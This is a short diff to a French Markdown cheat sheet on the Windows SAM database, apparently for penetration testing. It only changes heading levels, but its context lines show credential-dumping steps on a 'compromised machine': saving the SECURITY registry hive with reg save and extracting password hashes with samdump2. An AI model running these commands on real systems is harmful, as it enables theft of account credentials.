@@ -1,6 +1,6 @@
 # Base SAM
 
-## Récupérer la base SAM
+### Récupérer la base SAM
 
 En PowerShell sur une machine compromise, il faut exécuter les commandes suivantes :
 
@@ -12,7 +12,7 @@ reg save HKLM\security security
 
 _Note : les droits "administrateur local" sont requis._
 
-## Extraire les _hashs_
+### Extraire les _hashs_
 
 ```
 samdump2 system sam
